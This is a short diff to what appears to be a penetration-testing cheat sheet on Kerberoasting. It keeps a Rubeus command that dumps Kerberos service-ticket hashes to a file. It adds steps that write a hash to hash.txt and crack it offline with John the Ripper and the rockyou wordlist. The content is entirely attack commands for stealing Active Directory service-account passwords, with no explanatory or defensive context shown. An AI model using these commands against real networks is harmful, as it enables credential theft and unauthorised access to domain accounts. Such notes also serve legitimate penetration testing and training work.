@@ -18,3 +18,11 @@ Kerberoasting
 ```
 .\\Rubeus.exe kerberoast /outfile:kerberoast.hashes
 ```
+
+```
+echo '[hash]' > hash.txt
+```
+
+```
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+```
